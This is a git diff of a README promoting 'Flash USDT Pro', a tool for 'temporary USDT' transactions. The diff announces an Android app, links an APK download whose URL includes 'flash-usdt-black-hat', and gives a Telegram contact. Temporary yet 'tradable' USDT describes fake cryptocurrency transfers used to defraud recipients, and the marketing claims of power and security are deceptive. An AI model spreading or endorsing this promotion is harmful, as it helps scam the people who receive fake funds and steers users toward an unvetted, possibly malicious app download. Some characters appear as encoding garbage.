@@ -71,7 +71,7 @@ Flash USDT Pro is powered by **Node.js** and integrates **Web3.js** for seamless
 
 ---
 
-### Android App (Coming Soon!)
+### Android App (NEW!)
 ðŸ“Œ **Note:** The **Android version** have finished development and is available for download!
 https://apkpure.com/flash-usdt-black-hat/flash.usdtblackhat/download
 Stay tuned for updates.  
@@ -83,5 +83,6 @@ Stay tuned for updates.
 Flash USDT Pro is the **most powerful temporary USDT solution on the market**, offering **full network support, tradability, and top security**. Whether youâ€™re a trader, investor, or crypto enthusiast, this tool ensures you **control your funds with maximum flexibility**.
 
 ðŸš€ **Try Flash USDT Pro today and experience the next level of temporary USDT transactions!**
-Contact us on telegram 👇👇👇
+
+**Contact us on telegram** 👇👇👇
 https://t.me/Johnfrre
